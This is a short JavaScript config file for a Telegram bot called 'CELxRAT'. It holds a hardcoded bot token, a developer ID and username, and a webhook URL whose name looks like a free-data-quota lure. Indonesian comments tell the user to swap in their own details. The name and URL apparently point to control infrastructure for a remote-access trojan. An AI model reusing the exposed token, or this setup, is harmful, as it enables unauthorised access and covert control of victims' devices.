module.exports = {
    token: '8447717789:AAEHoP_IgrjY2acXXom4uDqWWv4yeptVZvY',
    devId: 7125611713, // GANTI DENGAN ID TELEGRAM LO
    devUsername: '@acelXmodz', // GANTI USERNAME LO
    botName: 'CELxRAT',
    version: '1.0',
    webhookUrl: 'https://koutagratis1gb.netlify.app/', // GANTI NANTI
    maintenance: false
};